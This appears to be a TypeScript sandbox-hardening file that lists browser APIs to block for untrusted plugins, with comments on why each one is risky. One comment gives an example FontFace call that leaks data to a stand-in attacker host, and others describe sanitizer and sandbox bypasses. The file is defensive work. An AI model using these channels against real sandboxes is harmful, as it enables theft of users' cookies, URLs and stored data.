export const BLOCKED_NATIVE_REFS = new Map<object, string>();

const method = (proto: object, key: string): object | undefined =>
  Object.getOwnPropertyDescriptor(proto, key)?.value as object | undefined;

const getter = (proto: object, key: string): object | undefined =>
  Object.getOwnPropertyDescriptor(proto, key)?.get;

const setter = (proto: object, key: string): object | undefined =>
  Object.getOwnPropertyDescriptor(proto, key)?.set;

const block = (ref: object | undefined, label: string) => {
  if (ref) {
    BLOCKED_NATIVE_REFS.set(ref, label);
  }
};

// Some IDL mixin attributes (e.g. `cookieStore` from
// `WindowOrWorkerGlobalScope`) end up on different prototypes across
// browsers — sometimes on `Window.prototype`, sometimes as an own
// property of the global. Walk the chain so the lookup is robust.
const getterFromChain = (obj: object, key: string): object | undefined => {
  let current: object | null = obj;
  while (current) {
    const desc = Object.getOwnPropertyDescriptor(current, key);
    if (desc) {
      return desc.get;
    }
    current = Object.getPrototypeOf(current);
  }
  return undefined;
};

// Network exfiltration
block(window.fetch, "window.fetch");
block(window.XMLHttpRequest, "window.XMLHttpRequest");
block(window.WebSocket, "window.WebSocket");
block(window.EventSource, "window.EventSource");
block(window.Worker, "window.Worker");
block(window.SharedWorker, "window.SharedWorker");
block(window.RTCPeerConnection, "window.RTCPeerConnection");
block(window.WebTransport, "WebTransport");
block(window.BroadcastChannel, "BroadcastChannel");
block(method(Navigator.prototype, "sendBeacon"), "Navigator.sendBeacon");

// `new FontFace(family, "url(https://attacker.example/?leak=...)").load()`
// issues a network request the same way `fetch` does. Block until CSP
// `font-src` is tightened (GDGT-2373).
if (window.FontFace) {
  block(method(window.FontFace.prototype, "load"), "FontFace.load");
}

// Stylesheet exfiltration. Block both the property accessors and
// the constructable-stylesheet entry points until CSP `font-src`/`img-src`
// is tightened (GDGT-2373). The getter is blocked too because in modern
// browsers `document.adoptedStyleSheets` is a directly-mutable.
// `ObservableArray`, so blocking only the setter would be defeated by
// `document.adoptedStyleSheets.push(sheet)`.
block(
  getter(Document.prototype, "adoptedStyleSheets"),
  "Document.get adoptedStyleSheets",
);
block(
  setter(Document.prototype, "adoptedStyleSheets"),
  "Document.set adoptedStyleSheets",
);
block(
  getter(ShadowRoot.prototype, "adoptedStyleSheets"),
  "ShadowRoot.get adoptedStyleSheets",
);
block(
  setter(ShadowRoot.prototype, "adoptedStyleSheets"),
  "ShadowRoot.set adoptedStyleSheets",
);
block(method(CSSStyleSheet.prototype, "replace"), "CSSStyleSheet.replace");
block(
  method(CSSStyleSheet.prototype, "replaceSync"),
  "CSSStyleSheet.replaceSync",
);

// Document mutation / navigation
block(method(Document.prototype, "write"), "Document.write");
block(method(Document.prototype, "writeln"), "Document.writeln");
block(method(Document.prototype, "open"), "Document.open");
block(method(Document.prototype, "close"), "Document.close");
block(method(Document.prototype, "execCommand"), "Document.execCommand");
block(setter(Document.prototype, "designMode"), "Document.set designMode");
block(
  setter(HTMLElement.prototype, "contentEditable"),
  "HTMLElement.set contentEditable",
);

// Cookie / domain
block(getter(Document.prototype, "cookie"), "Document.get cookie");
block(setter(Document.prototype, "cookie"), "Document.set cookie");
block(setter(Document.prototype, "domain"), "Document.set domain");
block(getterFromChain(window, "cookieStore"), "Window.get cookieStore");
if (window.CookieStore) {
  block(method(window.CookieStore.prototype, "get"), "CookieStore.get");
  block(method(window.CookieStore.prototype, "getAll"), "CookieStore.getAll");
  block(method(window.CookieStore.prototype, "set"), "CookieStore.set");
  block(method(window.CookieStore.prototype, "delete"), "CookieStore.delete");
}

// Referrer — URL of the page that linked here, which can leak internal
// admin URLs or embed-link query params. Unlike `location.href`, the plugin
// has no other way to read this.
block(getter(Document.prototype, "referrer"), "Document.get referrer");

// Host URL — `document.URL` / `documentURI` / `baseURI` resolve through the
// membrane to the *host* Document, so unlike the iframe-local
// `location.href`, these leak the page the user is actually on (dashboard
// IDs, embed tokens in query params, etc.).
block(getter(Document.prototype, "URL"), "Document.get URL");
block(getter(Document.prototype, "documentURI"), "Document.get documentURI");
block(getter(Node.prototype, "baseURI"), "Node.get baseURI");

// Storage exfiltration
block(getter(Window.prototype, "localStorage"), "Window.get localStorage");
block(getter(Window.prototype, "sessionStorage"), "Window.get sessionStorage");
block(getter(Window.prototype, "indexedDB"), "Window.get indexedDB");
block(getter(Window.prototype, "caches"), "Window.get caches");

block(getter(StorageEvent.prototype, "key"), "StorageEvent.get key");
block(getter(StorageEvent.prototype, "oldValue"), "StorageEvent.get oldValue");
block(getter(StorageEvent.prototype, "newValue"), "StorageEvent.get newValue");
block(getter(StorageEvent.prototype, "url"), "StorageEvent.get url");
block(
  getter(StorageEvent.prototype, "storageArea"),
  "StorageEvent.get storageArea",
);

// Window navigation
block(window.open, "window.open");
block(window.close, "window.close");
block(method(Window.prototype, "open"), "window.open");
block(method(Window.prototype, "close"), "window.close");

// UI dialogs — block modal/blocking dialogs initiated by the plugin so it
// can't freeze the host UI or phish via the browser chrome.
block(window.alert, "window.alert");
block(window.confirm, "window.confirm");
block(window.prompt, "window.prompt");
block(window.print, "window.print");
block(method(Window.prototype, "alert"), "window.alert");
block(method(Window.prototype, "confirm"), "window.confirm");
block(method(Window.prototype, "prompt"), "window.prompt");
block(method(Window.prototype, "print"), "window.print");
block(window.Notification, "window.Notification");

// UI hijack
block(
  method(HTMLDialogElement.prototype, "showModal"),
  "HTMLDialogElement.showModal",
);
block(
  method(Element.prototype, "requestFullscreen"),
  "Element.requestFullscreen",
);
block(window.PaymentRequest, "PaymentRequest");

// Navigator getters — credential / device leaks
const NAVIGATOR_BLOCKED_GETTERS = [
  "clipboard",
  "geolocation",
  "mediaDevices",
  "serviceWorker",
  "credentials",
  "permissions",
  "usb",
  "bluetooth",
  "share",
  "hid",
  "serial",
  "xr",
  "wakeLock",
  "locks",
  "storage",
  "presentation",
];
for (const key of NAVIGATOR_BLOCKED_GETTERS) {
  block(getter(Navigator.prototype, key), `Navigator.get ${key}`);
}
block(method(Navigator.prototype, "share"), "Navigator.share");

// History
block(method(History.prototype, "pushState"), "History.pushState");
block(method(History.prototype, "replaceState"), "History.replaceState");
block(method(History.prototype, "go"), "History.go");
block(method(History.prototype, "back"), "History.back");
block(method(History.prototype, "forward"), "History.forward");
block(getter(History.prototype, "state"), "History.get state");

// Performance / resource timing — entries expose URLs and timings of every
// resource the host has fetched (including auth-gated API calls)
block(method(Performance.prototype, "getEntries"), "Performance.getEntries");
block(
  method(Performance.prototype, "getEntriesByType"),
  "Performance.getEntriesByType",
);
block(
  method(Performance.prototype, "getEntriesByName"),
  "Performance.getEntriesByName",
);
block(window.PerformanceObserver, "PerformanceObserver");

// Coordinate-based caret APIs return a raw host Text/Element Node at the
// given (x, y) position, which bypasses the Element-level DOM decoy in
// distortions-dom-read.ts (those decoys gate on Element entry points;
// caret-from-point hands the plugin a Node directly). The plugin could
// systematically probe host coordinates to read text content. No legit
// viz needs caret-from-point queries.
block(
  method(Document.prototype, "caretRangeFromPoint"),
  "Document.caretRangeFromPoint",
);
block(
  method(Document.prototype, "caretPositionFromPoint"),
  "Document.caretPositionFromPoint",
);

// HTML parsing — these construct DOM from string input without going through
// the innerHTML/outerHTML/insertAdjacentHTML setters that DOMPurify
// sanitizes, so they'd otherwise be a clean bypass of that mitigation.
block(
  method(Range.prototype, "createContextualFragment"),
  "Range.createContextualFragment",
);
block(
  method(DOMParser.prototype, "parseFromString"),
  "DOMParser.parseFromString",
);
block(method(Element.prototype, "setHTMLUnsafe"), "Element.setHTMLUnsafe");
block(
  method(ShadowRoot.prototype, "setHTMLUnsafe"),
  "ShadowRoot.setHTMLUnsafe",
);
block(method(Document, "parseHTMLUnsafe"), "Document.parseHTMLUnsafe");

block(window.XSLTProcessor, "XSLTProcessor");
if (window.XSLTProcessor) {
  block(
    method(XSLTProcessor.prototype, "importStylesheet"),
    "XSLTProcessor.importStylesheet",
  );
  block(
    method(XSLTProcessor.prototype, "transformToFragment"),
    "XSLTProcessor.transformToFragment",
  );
  block(
    method(XSLTProcessor.prototype, "transformToDocument"),
    "XSLTProcessor.transformToDocument",
  );
}

// Programmatic activation — `.click()` on a synthesized <a> can navigate the
// host or trigger a download. Anchor href/target setters skip the
// `setAttribute("href", "javascript:...")` distortion, so block at the
// property setters too.
block(method(HTMLElement.prototype, "click"), "HTMLElement.click");
block(
  setter(HTMLAnchorElement.prototype, "href"),
  "HTMLAnchorElement.set href",
);
block(
  setter(HTMLAnchorElement.prototype, "target"),
  "HTMLAnchorElement.set target",
);

/**
 * Intentionally left out:
 *
 * Location — `window.location` itself is `[LegacyUnforgeable]`,
 * the Location attributes (`href`, `pathname`) are
 * also `[LegacyUnforgeable]` so they live on every Location instance rather
 * than on `Location.prototype`, AND `near-membrane-dom` runs the plugin in a
 * sandbox iframe with its own `Location` instance — so neither
 * `Location.prototype` distortions nor host instance descriptors match the
 * references the plugin sees. We rely on the iframe sandbox to keep Location
 * operations contained: the plugin can read/navigate its own iframe's
 * Location, but the host page stays put. The
 * `plugin location operations do not navigate the host` e2e test verifies
 * that boundary.
 *
 * `OffscreenCanvas`. The main "escape hatch" is `transferControlToOffscreen()`
 * + sending it to a Worker so rendering happens off-thread but Worker/SharedWorker
 * are blocked above, so `OffscreenCanvas` is effectively just an off-DOM canvas you
 * can render into on the main thread, roughly comparable to `document.createElement("canvas")`.
 */
